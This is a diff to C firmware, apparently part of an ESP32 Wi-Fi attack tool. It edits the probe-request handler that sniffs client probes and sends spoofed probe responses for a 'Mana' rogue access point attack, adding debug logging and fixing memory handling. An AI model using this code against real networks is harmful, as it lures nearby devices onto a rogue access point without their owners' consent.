@@ -705,11 +705,9 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
         ssid[ssid_len] = '\0';
         
         if (attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA_VERBOSE]) {
-            char *srcMac = malloc(sizeof(char) * 18);
-            // TODO: Check result
+            char srcMac[18];
             esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
             ESP_LOGI(TAG, "Probe for \"%s\" from %s", ssid, srcMac);
-            free(srcMac);
         }
         if (attack_status[ATTACK_MANA]) {
             /* Mana enabled - Send a probe response
@@ -739,13 +737,27 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
 
             if (ssid_len == 0) {
                 /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
+                #ifdef DEBUG
+                    ESP_LOGI(MANA_TAG, "Received broadcast probe from %s", strDestMac);
+                #endif
+
                 int i;
                 for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
                 if (i < networkCount) {
                     /* Found the station at networkList[i] - cycle through its SSIDs */
+                    #ifdef DEBUG
+                        ESP_LOGI(MANA_TAG, "Found station in networkList[], total %d SSIDs", networkList[i].ssidCount);
+                    #endif
                     for (int j=0; j < networkList[i].ssidCount; ++j) {
+                        #ifdef DEBUG
+                            ESP_LOGI(MANA_TAG, "Sending probe response to %s for \"%s\"", strDestMac, networkList[i].ssids[j]);
+                        #endif
                         send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], AUTH_TYPE_NONE);
                     }
+                } else {
+                    #ifdef DEBUG
+                        ESP_LOGI(MANA_TAG, "Did not find station in networkList[]");
+                    #endif
                 }
 
             } else {
@@ -761,10 +773,16 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                 for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
                 if (i < networkCount) {
                     /* The station is in networkList[] - See if it contains the SSID */
+                    #ifdef DEBUG
+                        ESP_LOGI(MANA_TAG, "STA %s matched to PNL for %s at networkList[%d]. PNL count: %d", strDestMac, networkList[i].strMac, i, networkList[i].ssidCount);
+                    #endif
                     int j;
                     for (j=0; j < networkList[i].ssidCount && strcmp(ssid, networkList[i].ssids[j]); ++j) { }
                     if (j == networkList[i].ssidCount) {
                         /* SSID was not found in ssids, add it to the list */
+                        #ifdef DEBUG
+                            ESP_LOGI(MANA_TAG, "SSID \"%s\" not found in PNL, add it", ssid);
+                        #endif
                         char **newSsids = malloc(sizeof(char *) * (j + 1));
                         if (newSsids == NULL) {
                             ESP_LOGW(MANA_TAG, "Unable to add SSID \"%s\" to PNL for STA %s", ssid, strDestMac);
@@ -781,12 +799,9 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
                             } else {
                                 strcpy(newSsids[j], ssid);
                                 /* Only replace networkList[i].ssids with newSsids if we make it all this way */
-                                /* Free networkList[i].ssids elements and array */
-                                for (int k=0; k < networkList[i].ssidCount; ++k) {
-                                    free(networkList[i].ssids[k]);
-                                }
                                 free(networkList[i].ssids);
                                 networkList[i].ssids = newSsids;
+                                networkList[i].ssidCount++;
                             }
                         }
                     }
